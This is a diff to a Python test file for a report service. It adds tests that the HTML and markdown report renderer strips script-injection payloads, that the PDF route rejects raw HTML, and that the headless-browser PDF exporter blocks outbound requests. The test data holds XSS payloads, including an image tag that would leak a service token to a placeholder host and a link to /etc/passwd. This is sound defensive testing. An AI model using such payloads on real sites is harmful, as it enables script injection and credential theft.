@@ -3,6 +3,7 @@ import json
 import sys
 import zipfile
 import asyncio
+import types
 from pathlib import Path
 
 import pytest
@@ -789,7 +790,20 @@ async def test_pdf_route_exports_report_to_storage_and_persists_metadata():
                 "report_id": "report-a",
                 "report_type": "final",
                 "markdown": "Finding references [EVID-001]",
-                "html": '<h1 onclick="evil()">Finding [EVID-001]</h1><script>bad()</script><a href="javascript:bad">bad</a>',
+                "evidence_refs": ["EVID-001"],
+            },
+        )
+        unsafe_html_response = await client.post(
+            "/api/limra/tasks/task-a/reports/pdf",
+            json={
+                "report_id": "report-html",
+                "markdown": "Finding references [EVID-001]",
+                "html": (
+                    '<img src=x onerror=alert(1)>'
+                    '<svg onload=alert(2)></svg>'
+                    '<iframe srcdoc="<script>bad()</script>"></iframe>'
+                    '<meta http-equiv="refresh" content="0;url=https://example.test">'
+                ),
                 "evidence_refs": ["EVID-001"],
             },
         )
@@ -821,6 +835,9 @@ async def test_pdf_route_exports_report_to_storage_and_persists_metadata():
     assert "<script" not in rendered_html.lower()
     assert "javascript:" not in rendered_html.lower()
     assert "onclick" not in rendered_html.lower()
+    assert "content-security-policy" in rendered_html.lower()
+    assert unsafe_html_response.status_code == 400
+    assert unsafe_html_response.json()["detail"] == "browser_report_html_not_allowed"
 
     report = repo.get_user_report(
         task_id="task-a",
@@ -855,6 +872,128 @@ async def test_pdf_route_exports_report_to_storage_and_persists_metadata():
     assert download_response.headers["content-type"].startswith("application/pdf")
     assert 'filename="report-a.pdf"' in download_response.headers["content-disposition"]
     assert foreign_download_response.status_code == 404
+
+
+def test_report_html_renderer_strips_active_markup_from_markdown():
+    rendered_html = limra._render_report_html(
+        markdown=(
+            "Finding [EVID-001]\n\n"
+            '<img src="https://example.test/leak?token=RUNNER_SERVICE_TOKEN" onerror=alert(1)>\n'
+            "<svg onload=alert(2)><text>bad</text></svg>\n"
+            '<iframe srcdoc="<script>bad()</script>"></iframe>\n'
+            '<meta http-equiv="refresh" content="0;url=https://example.test">\n'
+            '<a href="javascript:alert(3)">bad link</a>\n'
+            '<a href="data:text/html,bad">data link</a>\n'
+            '<a href="blob:https://example.test/bad">blob link</a>\n'
+            '<a href="file:///etc/passwd">file link</a>'
+        ),
+        evidence_refs=["EVID-001"],
+    )
+
+    lower_html = rendered_html.lower()
+    assert 'data-evidence-ref="EVID-001"' in rendered_html
+    assert "content-security-policy" in lower_html
+    for forbidden in [
+        "<img",
+        "onerror",
+        "<svg",
+        "onload",
+        "<iframe",
+        "srcdoc",
+        "refresh",
+        "<script",
+        "javascript:",
+        "data:",
+        "blob:",
+        "file:",
+        "https://example.test",
+        "runner_service_token",
+    ]:
+        assert forbidden not in lower_html
+
+
+@pytest.mark.asyncio
+async def test_playwright_pdf_exporter_blocks_browser_resource_requests(monkeypatch):
+    calls = {"launch_args": None, "closed": False}
+
+    class FakeRoute:
+        def __init__(self):
+            self.aborted = False
+
+        async def abort(self):
+            self.aborted = True
+
+    class FakePage:
+        def __init__(self):
+            self.routes = []
+            self.set_content_calls = []
+
+        async def route(self, pattern, handler):
+            self.routes.append((pattern, handler))
+
+        async def set_content(self, html_content, wait_until):
+            self.set_content_calls.append(
+                {"html_content": html_content, "wait_until": wait_until}
+            )
+
+        async def pdf(self, **kwargs):
+            return b"%PDF-1.7\nfake\n%%EOF"
+
+    class FakeBrowser:
+        def __init__(self, page):
+            self.page = page
+
+        async def new_page(self):
+            return self.page
+
+        async def close(self):
+            calls["closed"] = True
+
+    class FakeChromium:
+        def __init__(self, browser):
+            self.browser = browser
+
+        async def launch(self, args):
+            calls["launch_args"] = args
+            return self.browser
+
+    class FakePlaywrightContext:
+        def __init__(self, chromium):
+            self.chromium = chromium
+
+        async def __aenter__(self):
+            return types.SimpleNamespace(chromium=self.chromium)
+
+        async def __aexit__(self, exc_type, exc, tb):
+            return False
+
+    page = FakePage()
+    browser = FakeBrowser(page)
+    chromium = FakeChromium(browser)
+    async_api_module = types.ModuleType("playwright.async_api")
+    async_api_module.async_playwright = lambda: FakePlaywrightContext(chromium)
+    monkeypatch.setitem(sys.modules, "playwright", types.ModuleType("playwright"))
+    monkeypatch.setitem(sys.modules, "playwright.async_api", async_api_module)
+
+    pdf_bytes = await limra.PlaywrightLimraPdfExporter().render_pdf(
+        "<!doctype html><html><body>report</body></html>"
+    )
+
+    assert pdf_bytes.startswith(b"%PDF")
+    assert calls["launch_args"] == ["--no-sandbox"]
+    assert calls["closed"] is True
+    assert page.set_content_calls == [
+        {
+            "html_content": "<!doctype html><html><body>report</body></html>",
+            "wait_until": "load",
+        }
+    ]
+    assert len(page.routes) == 1
+    pattern, handler = page.routes[0]
+    assert pattern == "**/*"
+    route = FakeRoute()
+    await handler(route)
+    assert route.aborted is True
 
 
 def test_postgres_repository_sql_targets_limra_task_and_artifact_tables():
